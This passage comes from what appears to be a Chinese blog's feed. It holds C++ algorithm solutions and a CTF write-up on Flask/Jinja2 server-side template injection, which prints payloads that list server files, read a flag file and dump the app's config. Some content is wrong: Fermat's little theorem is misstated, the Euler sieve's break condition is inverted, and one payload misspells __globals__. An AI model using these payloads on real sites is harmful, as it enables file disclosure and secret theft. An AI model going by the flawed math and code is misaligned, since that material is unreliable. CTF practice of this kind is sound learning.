class="hljs-string">&quot;%d&quot;</span>,&amp;m[i][j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> ans =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;r;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;c;j++)<br>        &#123;<br>            ans = <span class="hljs-built_in">max</span>(ans,<span class="hljs-built_in">s</span>(i,j));<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,ans);<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://leetcode.cn/problems/number-of-increasing-paths-in-a-grid/">https://leetcode.cn/problems/number-of-increasing-paths-in-a-grid/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-type">int</span> m;<br>    <span class="hljs-type">int</span> mod;<br>    <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>] =&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">-1</span>&#125;;<br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;dp;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp;grid)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-type">int</span>&amp; v = dp[x][y];<br>        <span class="hljs-keyword">if</span>(v!=<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> v;<br>        v = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> nx= x+dx[i];<br>            <span class="hljs-type">int</span> ny = y+dy[i];<br>            <span class="hljs-keyword">if</span>(nx&gt;=<span class="hljs-number">0</span> &amp;&amp; nx&lt;m &amp;&amp; ny&gt;=<span class="hljs-number">0</span> &amp;&amp; ny&lt;n &amp;&amp; grid[nx][ny]&gt;grid[x][y])<br>            &#123;<br>                v =(v+<span class="hljs-built_in">dfs</span>(nx,ny,grid))%mod;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> v;<br>    &#125;;<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countPaths</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans =<span class="hljs-number">0</span>;<br>        m =grid.<span class="hljs-built_in">size</span>();<br>        n = grid[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        mod = <span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;<span class="hljs-built_in">dp</span>(m,<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n,<span class="hljs-number">0</span>));<br>        <span class="hljs-keyword">this</span>-&gt;dp = dp;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<br>            &#123;<br>                ans =(ans+<span class="hljs-built_in">dfs</span>(i,j,grid))%mod;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>快速幂</title>
    <link href="/2022/04/21/%E5%BF%AB%E9%80%9F%E5%B9%82/"/>
    <url>/2022/04/21/%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
    
    <content type="html"><![CDATA[<h4 id="快速幂"><a href="#快速幂" class="headerlink" title="快速幂"></a>快速幂</h4><p>快速幂的核心思想即为，将幂指数变成二进制的形式，来拆解乘积，减少运算的次数，既预处理又能防止溢出。<br>模板题：<br><a href="https://www.acwing.com/problem/content/submission/code_detail/14148818/">https://www.acwing.com/problem/content/submission/code_detail/14148818/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,p;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d%d&quot;</span>,&amp;a,&amp;b,&amp;p);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,<span class="hljs-built_in">qkm</span>(a,b,p));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="快速幂求逆元"><a href="#快速幂求逆元" class="headerlink" title="快速幂求逆元"></a>快速幂求逆元</h4><h5 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h5><p>费马小定理：<br>p为质数，且a，p互质则。<br>a^p&#x3D;1(modp)<br>欧拉定理：<br>对任意互素的a，n，有<br>a^phi(n) &#x3D;1 (mod n)<br>费马小定理为欧拉定义的特殊情况。<br>由此可以推出乘法逆元的充要条件。<br><img src="/upload/2022/05/image-32345a416c644b6a88a24777d80106b8.png" alt="image.png"><br>模板：<br><a href="https://www.acwing.com/problem/content/878/">https://www.acwing.com/problem/content/878/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">qkm</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> p)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> res =<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(b)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(b&amp;<span class="hljs-number">1</span>) res =(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)res*a%p;<br>        b&gt;&gt;=<span class="hljs-number">1</span>;<br>        a=(<span class="hljs-type">long</span> <span class="hljs-type">long</span>)a*a%p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>    <br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,p;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;a,&amp;p);<br>        <span class="hljs-type">int</span> res = <span class="hljs-built_in">qkm</span>(a,p<span class="hljs-number">-2</span>,p);<br>        <span class="hljs-keyword">if</span>(a%p!=<span class="hljs-number">0</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,res);<br>        <span class="hljs-keyword">else</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;impossible\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>高斯消元解线性方程组</title>
    <link href="/2022/04/19/%E9%AB%98%E6%96%AF%E6%B6%88%E5%85%83%E8%A7%A3%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/"/>
    <url>/2022/04/19/%E9%AB%98%E6%96%AF%E6%B6%88%E5%85%83%E8%A7%A3%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>求方程组的解即为线性代数中Ax&#x3D;b的解。<br>通过高斯消元，将每一个要解的变量系数化为1。<br>若主对角线上均为1，则正好有一组解，带回求解即可。<br>若有一组方程化简完后为 0&#x3D;0形式，则有无数组解。<br>若有一组方程为，0 &#x3D; b的形式，那么则无解。<br>代码即为模拟消元的过程：<br>模板题：<a href="https://www.acwing.com/problem/content/885/">https://www.acwing.com/problem/content/885/</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">110</span>;<br><span class="hljs-type">double</span> a[N][N];<br><span class="hljs-type">const</span> <span class="hljs-type">double</span> eps = <span class="hljs-number">1e-8</span>;<span class="hljs-comment">//浮点数精度问题</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gauss</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> c;<br>    <span class="hljs-type">int</span> r =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(c=<span class="hljs-number">0</span>;c&lt;n;c++)<span class="hljs-comment">//遍历每一列</span><br>    &#123;<br>        <span class="hljs-type">int</span> t =r;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=r;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">fabs</span>(a[i][c])&gt;<span class="hljs-built_in">fabs</span>(a[t][c])) t =i;<span class="hljs-comment">//找到绝对值最大值</span><br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">fabs</span>(a[t][c])&lt;eps) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果最大值为0，那么所有数都为0.</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =c;i&lt;=n;i++) <span class="hljs-built_in">swap</span>(a[t][i],a[r][i]);<span class="hljs-comment">//将该行换到第r行</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n;i&gt;=c;i--) a[r][i] = a[r][i]/a[r][c];<span class="hljs-comment">//当前行第一个非0数变为1，同时对该行所有系数除</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=r+<span class="hljs-number">1</span>;i&lt;n;i++)<span class="hljs-comment">// 把当前列下面的所有数，全部消成 0</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(a[i][c])&gt;eps)<span class="hljs-comment">//当该列的数不为0时</span><br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=n;j&gt;=c;j--)<br>                &#123;<br>                    a[i][j] =a[i][j] -a[r][j]*a[i][c];<span class="hljs-comment">//第r行的所有系数乘以a[i][c]倍</span><br>                                                      <span class="hljs-comment">//从而把当前列下面的所有数都消成0</span><br>                                                      <span class="hljs-comment">//因为第r行第c列的系数已经为1.</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        r++;<span class="hljs-comment">//处理下一行</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(r&lt;n)<span class="hljs-comment">//剩下方程的个数是小于 n 的，说明不是唯一解，判断是无解还是无穷多解</span><br>    &#123;<br>        <span class="hljs-comment">// 因为已经是阶梯型，所以 r ~ n-1 的值应该都为 0</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r; i &lt; n; i ++ )<span class="hljs-comment">// </span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &gt; eps)<span class="hljs-comment">// a[i][n] 代表 b_i ,即 左边=0，右边=b_i,0 != b_i, 所以无解。</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-comment">// 否则， 0 = 0，就是r ~ n-1的方程都是多余方程,有无穷组解。</span><br>    &#125;<br>    <span class="hljs-comment">//有唯一解，从下往上带，得到方程的解</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<span class="hljs-comment">//行</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;n;j++)<br>        &#123;<br>            a[i][n] =a[i][n]- a[j][n] * a[i][j];<br>            <span class="hljs-comment">//因为只要得到解，所以只用对 b_i 进行操作，中间的值，可以不用操作，因为不用输出</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=n;j++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lf&quot;</span>,&amp;a[i][j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> res= <span class="hljs-built_in">gauss</span>();<br>    <span class="hljs-keyword">if</span>(res==<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Infinite group solutions\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(res==<span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No solution\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &lt; eps) a[i][n] = <span class="hljs-number">0</span>; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2lf\n&quot;</span>,a[i][n]);<br>        &#125;<br>    &#125;<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ssti模板注入</title>
    <link href="/2022/04/15/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/04/15/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是ssti模板注入"><a href="#什么是ssti模板注入" class="headerlink" title="什么是ssti模板注入"></a>什么是ssti模板注入</h2><p>SSTI就是服务器端模板注入(Server-Side Template Injection)。<br>render_template渲染函数的问题，是引发该问题的原因。渲染函数在渲染的时候，往往对用户输入的变量不做渲染。<br>例如，在flask框架中，Jinjia2模板引擎将</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;&#125;&#125;<br></code></pre></td></tr></table></figure><p>包裹的当成变量解析替换。</p><h2 id="常用模板引擎"><a href="#常用模板引擎" class="headerlink" title="常用模板引擎"></a>常用模板引擎</h2><p>网站模板引擎有jinja2、tornado、smarty、twig等等，那么如何判断遇到的是哪种类型，常用图如下。<br><img src="/upload/2022/04/image-c3234947943c4932ad036e47e3c54013.png" alt="image.png"></p><h2 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h2><p>__class__用来查看变量所属的类<br>__bases__用来查看类的基类。<br><strong>subclasses</strong>()查看当前类的子类。<br><strong>init</strong> 初始化类，返回的类型是function<br><strong>globals</strong> 获取function所处空间下可使用的module、方法以及所有变量。<br>操作例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;//爆出所有能用的类。<br><br></code></pre></td></tr></table></figure><h2 id="Flask特有的变量和函数。"><a href="#Flask特有的变量和函数。" class="headerlink" title="Flask特有的变量和函数。"></a>Flask特有的变量和函数。</h2><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>config 对象就是Flask的config对象，也就是 app.config 对象</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><p> Flask中代表当前请求的request对象<br>###session<br> Flask的session对象<br>###url_for()<br>url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接</p><p>###get_flashed_messages()<br>这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉。<br>例题：<br>1.XCTF：Web_python_template_injection<br><img src="/upload/2022/04/image-46c662b8394e48f6a26e8b6bfb721742.png" alt="image.png"><br>Jinjia模板，可以ssti注入。<br>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure><p>查出所有的类。<br>使用第72个site._Printer类（可以进行命令执行）<br>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()<br>[<span class="hljs-number">71</span>].__init__.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].listdir(<span class="hljs-string">&#x27;.&#x27;</span>)&#125;&#125;<br>列出所有文件<br></code></pre></td></tr></table></figure><p><img src="/upload/2022/04/image-b563824f1043400b9aa52c2bc7f7913b.png" alt="image.png"></p><p>然后，使用[40]的file类，得到flag。<br><img src="/4" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;fl4g&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>拿到flag.<br><img src="/upload/2022/04/image-577cfcb34d334702bfa27c86cfaac773.png" alt="image.png"></p><p>2.xctf shrine<br>进入查看源码。<br><img src="/upload/2022/04/image-bfa04c70a0c846b181d4211d604999e1.png" alt="image.png"></p><p>源码审计，测试&#x2F;shrine&#x2F;下有回显，但发现过滤 config变量和 self。并且会去除单边括号，所以上题方法失效了。<br>使用url_for函数。<br>url_for.__globals__获取全部全局变量。<br><img src="/upload/2022/04/image-99fc2228abed493ca61310c8b7f2ef85.png" alt="image.png"><br>然后找到app<br>构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;url_for.__gloabls__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br></code></pre></td></tr></table></figure><p>输入发现flag。<br><img src="/upload/2022/04/image-b563824f1043400b9aa52c2bc7f7913b.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>欧拉筛法</title>
    <link href="/2022/04/15/%E6%AC%A7%E6%8B%89%E7%AD%9B%E6%B3%95/"/>
    <url>/2022/04/15/%E6%AC%A7%E6%8B%89%E7%AD%9B%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>基本知识：<br>1.任何一个素数的倍数一定不是素数。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br><span class="hljs-type">int</span> prime[N],cnt;<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ol</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++）<br>   &#123;<br><span class="hljs-keyword">if</span>(!st[i])prime[cnt++] = i;<span class="hljs-comment">//如果i是素数，将其加入素数数组中</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;prime[j]&lt;=n/i;j++)<span class="hljs-comment">//从小到大枚举所有质数。</span><br>&#123;<br>   <span class="hljs-comment">//关于prime[j]&lt;=n/i；</span><br>   <span class="hljs-comment">//若i为合数，当prime[j]枚举到i的最小质因子时便会break掉。</span><br>         <span class="hljs-comment">//若i为质数，则枚举到i便会退出。</span><br>   st[prime[j]*i]=<span class="hljs-literal">true</span>;<span class="hljs-comment">//将 prime[j]*i筛掉</span><br>   <span class="hljs-keyword">if</span>(i%prime[j]) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//若prime[j]是i的最小质因子，则退出。否则继续循环筛数。从而保证每个数，只被它的最小质因子筛掉。</span><br>&#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第一次CTF比赛总结</title>
    <link href="/2022/04/13/%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2022/04/13/%E7%AC%AC%E4%B8%80%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
    
